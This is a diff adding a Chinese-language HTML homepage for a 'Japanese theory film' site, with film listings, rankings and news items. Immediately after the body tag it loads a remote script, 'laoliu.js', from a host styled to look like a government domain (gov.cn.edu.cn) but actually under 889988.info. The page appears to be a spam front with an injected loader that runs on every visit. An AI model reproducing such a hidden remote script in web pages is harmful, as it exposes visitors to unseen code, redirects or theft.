@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>日本理论电影网 - 经典日影·深度解析·在线观赏</title>
+<meta name="description" content="日本理论电影网专注日本经典电影、艺术电影、独立电影的在线观看与深度解析，提供高质量影视内容与专业影评。" />
+<meta name="keywords" content="日本理论电影网,日本电影,日影,艺术电影,独立电影,ribenlilundianyingwang-h5.github.io" />
+<meta name="author" content="日本理论电影网" />
+<meta name="robots" content="index,follow" />
+<style>
+/* ===== 全局：极简日式风格 ===== */
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  font-family:"Noto Serif SC","Source Han Serif SC","SimSun",Georgia,serif;
+  background:#faf8f5;
+  color:#2c2c2c;
+  line-height:1.9;
+  letter-spacing:0.03em;
+}
+a{color:#8b2f3f;text-decoration:none;transition:color .3s;}
+a:hover{color:#c0845a;}
+
+/* ===== 顶部导航：极简细线 ===== */
+header{
+  background:#fff;
+  border-bottom:1px solid #e8e2dc;
+  padding:18px 24px;
+  position:sticky;top:0;z-index:100;
+}
+.nav-wrap{
+  max-width:1080px;margin:0 auto;
+  display:flex;justify-content:space-between;align-items:center;
+}
+.logo{
+  font-size:20px;font-weight:700;color:#8b2f3f;
+  letter-spacing:0.15em;
+}
+.logo span{display:block;font-size:11px;font-weight:400;color:#999;letter-spacing:0.3em;margin-top:2px;}
+nav ul{display:flex;gap:28px;list-style:none;}
+nav ul li a{font-size:14px;color:#444;}
+nav ul li a:hover{color:#8b2f3f;}
+
+/* ===== Hero：大面积留白 + 竖排文字装饰 ===== */
+.hero{
+  max-width:1080px;margin:0 auto;padding:80px 24px 60px;
+  display:flex;align-items:center;justify-content:space-between;gap:40px;
+}
+.hero-text{flex:1;}
+.hero-text h1{
+  font-size:42px;font-weight:700;color:#8b2f3f;line-height:1.4;
+  margin-bottom:20px;
+}
+.hero-text h1 em{
+  font-style:normal;display:block;font-size:16px;color:#999;
+  font-weight:400;letter-spacing:0.2em;margin-bottom:8px;
+}
+.hero-text p{font-size:15px;color:#666;max-width:420px;}
+.hero-deco{
+  writing-mode:vertical-rl;
+  font-size:72px;color:#e8e2dc;font-weight:700;letter-spacing:0.2em;
+  user-select:none;
+}
+
+/* ===== 通用栏目 ===== */
+.section{max-width:1080px;margin:50px auto;padding:0 24px;}
+.section-head{margin-bottom:28px;}
+.section-head h2{
+  font-size:22px;font-weight:700;color:#2c2c2c;
+  display:flex;align-items:baseline;gap:12px;
+}
+.section-head h2::before{
+  content:"";width:6px;height:22px;background:#8b2f3f;display:inline-block;
+}
+.section-head .en{
+  font-size:12px;color:#bbb;letter-spacing:0.2em;font-weight:400;
+}
+
+/* ===== 栏目1：精选片单 - 杂志式左右交错布局 ===== */
+.feature-list{display:flex;flex-direction:column;gap:32px;}
+.feature-item{
+  display:flex;gap:24px;align-items:flex-start;
+  background:#fff;border:1px solid #e8e2dc;padding:20px;
+  transition:box-shadow .3s;
+}
+.feature-item:hover{box-shadow:0 4px 20px rgba(139,47,63,0.08);}
+.feature-item:nth-child(even){flex-direction:row-reverse;}
+.feature-num{
+  font-size:36px;font-weight:700;color:#e8e2dc;line-height:1;
+  min-width:48px;
+}
+.feature-body{flex:1;}
+.feature-body h3{font-size:17px;margin-bottom:8px;color:#2c2c2c;}
+.feature-body p{font-size:13px;color:#888;}
+.feature-body .tag{
+  display:inline-block;font-size:11px;background:#f0ebe5;color:#8b2f3f;
+  padding:2px 8px;border-radius:2px;margin-top:8px;
+}
+
+/* ===== 栏目2：分类导航 - 表格式四宫格 ===== */
+.cat-table{
+  display:grid;grid-template-columns:repeat(4,1fr);
+  border-top:2px solid #8b2f3f;border-left:1px solid #e8e2dc;
+}
+.cat-cell{
+  border-right:1px solid #e8e2dc;border-bottom:1px solid #e8e2dc;
+  padding:28px 16px;text-align:center;background:#fff;
+  transition:background .3s;
+}
+.cat-cell:hover{background:#8b2f3f;}
+.cat-cell:hover .cat-icon,
+.cat-cell:hover .cat-name{color:#fff;}
+.cat-icon{font-size:28px;color:#8b2f3f;margin-bottom:8px;display:block;transition:color .3s;}
+.cat-name{font-size:14px;color:#444;transition:color .3s;}
+
+/* ===== 栏目3：排行榜 - 数字强调竖列 ===== */
+.rank-section{background:#2c2c2c;padding:50px 24px;margin:50px 0;}
+.rank-wrap{max-width:1080px;margin:0 auto;}
+.rank-wrap .section-head h2{color:#fff;}
+.rank-wrap .section-head h2::before{background:#c0845a;}
+.rank-list{display:flex;flex-direction:column;}
+.rank-row{
+  display:flex;align-items:center;gap:20px;
+  padding:14px 0;border-bottom:1px solid #444;
+}
+.rank-row:last-child{border-bottom:none;}
+.rank-idx{
+  font-size:28px;font-weight:700;color:#c0845a;min-width:40px;
+}
+.rank-idx.top{color:#e8c07a;}
+.rank-title{flex:1;font-size:15px;color:#ddd;}
+.rank-score{font-size:13px;color:#8b2f3f;background:#3a3a3a;padding:2px 10px;border-radius:2px;}
+
+/* ===== 栏目4：最新动态 - 简洁列表+日期 ===== */
+.news-list{display:flex;flex-direction:column;}
+.news-item{
+  display:flex;gap:20px;padding:16px 0;
+  border-bottom:1px dashed #e8e2dc;
+}
+.news-item:last-child{border-bottom:none;}
+.news-date{
+  min-width:80px;font-size:12px;color:#c0845a;
+  border-right:2px solid #e8e2dc;padding-right:16px;
+}
+.news-date strong{display:block;font-size:22px;color:#8b2f3f;font-weight:700;}
+.news-content h3{font-size:15px;margin-bottom:4px;}
+.news-content p{font-size:13px;color:#999;}
+
+/* ===== 栏目5：关于我们 - 卡片堆叠 ===== */
+.about-area{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+.about-card{background:#fff;border:1px solid #e8e2dc;padding:28px;}
+.about-card h3{font-size:16px;color:#8b2f3f;margin-bottom:12px;}
+.about-card p{font-size:14px;color:#666;}
+.stats-row{display:flex;gap:16px;margin-top:16px;}
+.stat-box{
+  flex:1;text-align:center;background:#f7f4f0;padding:16px 8px;
+}
+.stat-box .num{font-size:28px;font-weight:700;color:#8b2f3f;}
+.stat-box .label{font-size:12px;color:#999;margin-top:4px;}
+
+/* ===== 底部 ===== */
+footer{
+  background:#2c2c2c;color:#888;text-align:center;
+  padding:32px 24px;font-size:13px;margin-top:60px;
+}
+footer a{color:#c0845a;}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<header>
+  <div class="nav-wrap">
+    <div class="logo">日本理论电影网<span>JAPANESE FILM ARCHIVE</span></div>
+    <nav>
+      <ul>
+        <li><a href="#">首页</a></li>
+        <li><a href="#">精选片单</a></li>
+        <li><a href="#">分类导航</a></li>
+        <li><a href="#">排行榜</a></li>
+        <li><a href="#">最新动态</a></li>
+        <li><a href="#">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-text">
+    <h1><em>日本理論電影網</em>日本理论电影网</h1>
+    <p>聚焦日本经典电影、艺术电影与独立影像的深度解析与在线观赏，以专业的视角带你走进日本电影的美学世界。</p>
+  </div>
+  <div class="hero-deco">映画</div>
+</section>
+
+<!-- 栏目1：精选片单 -->
+<section class="section">
+  <div class="section-head">
+    <h2>精选片单 <span class="en">FEATURED FILMS</span></h2>
+  </div>
+  <div class="feature-list">
+    <div class="feature-item">
+      <div class="feature-num">01</div>
+      <div class="feature-body">
+        <h3>东京物语 · 小津安二郎</h3>
+        <p>日本电影史上的不朽经典，以平静克制的镜头语言描绘家庭关系与时代变迁。</p>
+        <span class="tag">剧情 · 1953</span>
+      </div>
+    </div>
+    <div class="feature-item">
+      <div class="feature-num">02</div>
+      <div class="feature-body">
+        <h3>罗生门 · 黑泽明</h3>
+        <p>多重视角叙事的里程碑之作，探讨人性真相的复杂与不可知。</p>
+        <span class="tag">悬疑 · 1950</span>
+      </div>
+    </div>
+    <div class="feature-item">
+      <div class="feature-num">03</div>
+      <div class="feature-body">
+        <h3>千与千寻 · 宫崎骏</h3>
+        <p>动画艺术的巅峰之作，用奇幻故事包裹成长与勇气的内核。</p>
+        <span class="tag">动画 · 2001</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：分类导航 -->
+<section class="section">
+  <div class="section-head">
+    <h2>分类导航 <span class="en">CATEGORIES</span></h2>
+  </div>
+  <div class="cat-table">
+    <div class="cat-cell"><span class="cat-icon">🎭</span><span class="cat-name">剧情</span></div>
+    <div class="cat-cell"><span class="cat-icon">👻</span><span class="cat-name">恐怖</span></div>
+    <div class="cat-cell"><span class="cat-icon">💕</span><span class="cat-name">爱情</span></div>
+    <div class="cat-cell"><span class="cat-icon">🔍</span><span class="cat-name">悬疑</span></div>
+    <div class="cat-cell"><span class="cat-icon">⚔️</span><span class="cat-name">动作</span></div>
+    <div class="cat-cell"><span class="cat-icon">🌸</span><span class="cat-name">文艺</span></div>
+    <div class="cat-cell"><span class="cat-icon">🎪</span><span class="cat-name">动画</span></div>
+    <div class="cat-cell"><span class="cat-icon">📽️</span><span class="cat-name">纪录片</span></div>
+  </div>
+</section>
+
+<!-- 栏目3：排行榜 -->
+<section class="rank-section">
+  <div class="rank-wrap">
+    <div class="section-head">
+      <h2>本周热播榜 <span class="en">WEEKLY TOP</span></h2>
+    </div>
+    <div class="rank-list">
+      <div class="rank-row">
+        <span class="rank-idx top">01</span>
+        <span class="rank-title">七武士 · 黑泽明</span>
+        <span class="rank-score">9.3</span>
+      </div>
+      <div class="rank-row">
+        <span class="rank-idx top">02</span>
+        <span class="rank-title">情书 · 岩井俊二</span>
+        <span class="rank-score">9.1</span>
+      </div>
+      <div class="rank-row">
+        <span class="rank-idx top">03</span>
+        <span class="rank-title">菊次郎的夏天 · 北野武</span>
+        <span class="rank-score">8.8</span>
+      </div>
+      <div class="rank-row">
+        <span class="rank-idx">04</span>
+        <span class="rank-title">告白 · 中岛哲也</span>
+        <span class="rank-score">8.6</span>
+      </div>
+      <div class="rank-row">
+        <span class="rank-idx">05</span>
+        <span class="rank-title">小森林 · 森淳一</span>
+        <span class="rank-score">8.5</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：最新动态 -->
+<section class="section">
+  <div class="section-head">
+    <h2>最新动态 <span class="en">LATEST NEWS</span></h2>
+  </div>
+  <div class="news-list">
+    <div class="news-item">
+      <div class="news-date"><strong>10</strong>06月</div>
+      <div class="news-content">
+        <h3>是枝裕和最新力作《怪物》深度解析上线</h3>
+        <p>从叙事结构到视听语言，全面拆解这部戛纳最佳剧本获奖影片。</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <div class="news-date"><strong>05</strong>06月</div>
+      <div class="news-content">
+        <h3>日本电影周：回顾今敏的动画世界</h3>
+        <p>《红辣椒》《千年女优》等经典作品专题回顾，致敬天才动画导演。</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <div class="news-date"><strong>28</strong>05月</div>
+      <div class="news-content">
+        <h3>沟口健二女性电影专题更新</h3>
+        <p>《雨月物语》《西鹤一代女》等作品的艺术价值再探讨。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于我们 -->
+<section class="section">
+  <div class="section-head">
+    <h2>关于我们 <span class="en">ABOUT US</span></h2>
+  </div>
+  <div class="about-area">
+    <div class="about-card">
+      <h3>网站简介</h3>
+      <p><strong>日本理论电影网</strong> 致力于推广日本电影文化，为影迷提供高质量的影视内容与专业的深度解析。我们相信每一部电影都是一面镜子，映照出人性的复杂与美好。</p>
+      <div class="stats-row">
+        <div class="stat-box"><div class="num">3000+</div><div class="label">影片资源</div></div>
+        <div class="stat-box"><div class="num">500+</div><div class="label">深度影评</div></div>
+        <div class="stat-box"><div class="num">10万+</div><div class="label">注册用户</div></div>
+      </div>
+    </div>
+    <div class="about-card">
+      <h3>联系我们</h3>
+      <p>网站地址：<a href="https://ribenlilundianyingwang-h5.github.io">https://ribenlilundianyingwang-h5.github.io</a></p>
+      <p>商务合作：请联系本站管理员</p>
+      <p>内容投稿：欢迎影评人、电影爱好者投稿原创内容</p>
+      <p>意见反馈：您可以在本站任何页面留言反馈</p>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer>
+  <p>© 2026 日本理论电影网 | 网站名称：日本理论电影网 | 网址：<a href="https://ribenlilundianyingwang-h5.github.io">https://ribenlilundianyingwang-h5.github.io</a></p>
+</footer>
+
+</body>
+</html>
